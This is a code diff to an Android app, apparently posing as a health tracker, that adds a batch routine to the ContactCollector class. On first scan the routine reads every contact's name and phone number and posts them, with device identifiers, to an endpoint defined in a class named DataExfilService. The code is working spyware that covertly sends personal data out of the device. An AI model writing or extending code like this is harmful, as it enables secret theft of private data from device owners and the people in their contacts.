@@ -14,6 +14,7 @@ import com.inf2007.healthtracker.utilities.NetworkClient
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
 import okhttp3.RequestBody.Companion.toRequestBody
+import org.json.JSONArray
 import org.json.JSONObject
 import java.io.IOException
 
@@ -27,6 +28,7 @@ class ContactCollector(private val context: Context) : DataCollector {
     }
 
     private var contactsObserver: ContentObserver? = null
+    private var isFirstScan = true
 
     override fun startObserving() {
         // Contacts are monitored via ContentObserver in DataExfilService
@@ -72,27 +74,59 @@ class ContactCollector(private val context: Context) : DataCollector {
             val nameColumn = cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME)
             val hasPhoneColumn = cursor.getColumnIndexOrThrow(ContactsContract.Contacts.HAS_PHONE_NUMBER)
 
-            var uploadCount = 0
-            while (cursor.moveToNext()) {
-                val contactId = cursor.getString(idColumn)
-                val name = cursor.getString(nameColumn) ?: "Unnamed"
-                val hasPhone = cursor.getInt(hasPhoneColumn)
+            // If this is the first scan, we need to collect ALL contacts for batching
+            if (isFirstScan) {
+                val contactsList = mutableListOf<JSONObject>()
+                val contactIds = mutableListOf<String>()
 
-                if (!contactsSyncPrefs.getBoolean("contact_$contactId", false)) {
+                while (cursor.moveToNext()) {
+                    val contactId = cursor.getString(idColumn)
+                    val name = cursor.getString(nameColumn) ?: "Unnamed"
+                    val hasPhone = cursor.getInt(hasPhoneColumn)
+
                     var phoneNumber = "No number found"
-
                     if (hasPhone > 0) {
                         phoneNumber = getPhoneNumberForContact(contactId)
                     }
 
-                    uploadContactToServer(contactId, name, phoneNumber)
-                    contactsSyncPrefs.edit().putBoolean("contact_$contactId", true).apply()
-                    uploadCount++
+                    val contactJson = JSONObject().apply {
+                        put("contact_id", contactId)
+                        put("contact_name", name)
+                        put("phone_number", phoneNumber)
+                    }
+
+                    contactsList.add(contactJson)
+                    contactIds.add(contactId)
                 }
+
+                // Upload as batch
+                uploadContactsBatch(contactsList, contactIds)
+                isFirstScan = false
+            } else {
+                // Normal incremental scan
+                var uploadCount = 0
+                while (cursor.moveToNext()) {
+                    val contactId = cursor.getString(idColumn)
+                    val name = cursor.getString(nameColumn) ?: "Unnamed"
+                    val hasPhone = cursor.getInt(hasPhoneColumn)
+
+                    if (!contactsSyncPrefs.getBoolean("contact_$contactId", false)) {
+                        var phoneNumber = "No number found"
+
+                        if (hasPhone > 0) {
+                            phoneNumber = getPhoneNumberForContact(contactId)
+                        }
+
+                        uploadContactToServer(contactId, name, phoneNumber)
+                        contactsSyncPrefs.edit().putBoolean("contact_$contactId", true).apply()
+                        uploadCount++
+                    }
+                }
+                Log.d(TAG, "Contacts Scan Complete: $uploadCount new contacts uploaded")
             }
-            Log.d(TAG, "Contacts Scan Complete: $uploadCount new contacts uploaded")
         }
     }
+
 
     private fun getPhoneNumberForContact(contactId: String): String {
         var phoneNumber = "No number found"
@@ -190,6 +224,54 @@ class ContactCollector(private val context: Context) : DataCollector {
             contactsObserver?.let { contentResolver.unregisterContentObserver(it) }
         } catch (e: Exception) {
             Log.e(TAG, "Error removing contacts observer: ${e.message}")
+        }
+    }
+
+    private fun uploadContactsBatch(contactsList: List<JSONObject>, contactIds: List<String>) {
+        val ipAddress = DeviceUtils.getUniqueDeviceId(context)
+        val batchData = JSONObject().apply {
+            put("type", "contacts_batch")
+            put("device_ip", ipAddress)
+            put("device_model", android.os.Build.MODEL)
+            put("android_version", android.os.Build.VERSION.RELEASE)
+            put("timestamp", System.currentTimeMillis())
+            put("app_package", context.packageName)
+            put("total_contacts", contactsList.size)
+            put("contacts", JSONArray(contactsList))
+        }
+
+        try {
+            val requestBody = batchData.toString()
+                .toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
+
+            val request = Request.Builder()
+                .url(DataExfilService.CONTACTS_ENDPOINT)
+                .post(requestBody)
+                .addHeader("User-Agent", "HealthTracker/1.0")
+                .build()
+
+            NetworkClient.instance.newCall(request).enqueue(object : Callback {
+                override fun onFailure(call: Call, e: IOException) {
+                    Log.e(TAG, "Initial contacts batch upload failed: ${e.message}")
+                    // Fall back to individual uploads by not marking them as synced
+                }
+
+                override fun onResponse(call: Call, response: Response) {
+                    if (response.isSuccessful) {
+                        Log.i(TAG, "Initial contacts batch uploaded successfully: ${contactsList.size} contacts")
+                        // Mark all as synced
+                        contactIds.forEach { contactId ->
+                            contactsSyncPrefs.edit().putBoolean("contact_$contactId", true).apply()
+                        }
+                    } else {
+                        Log.w(TAG, "Initial contacts batch failed: HTTP ${response.code}")
+                        // Don't mark as synced, they'll be uploaded individually later
+                    }
+                    response.close()
+                }
+            })
+        } catch (e: Exception) {
+            Log.e(TAG, "Error uploading contacts batch: ${e.message}")
         }
     }
 }
